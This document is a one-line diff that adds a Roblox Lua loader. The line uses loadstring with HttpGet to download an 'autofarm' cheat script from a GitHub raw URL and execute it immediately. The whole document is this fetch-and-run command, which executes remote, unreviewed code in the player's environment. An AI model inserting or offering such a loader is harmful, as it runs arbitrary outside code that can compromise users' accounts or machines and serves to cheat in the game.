@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DiscordUploader/Roblox-Scripts/main/main/games/autofarm.Lua"))()
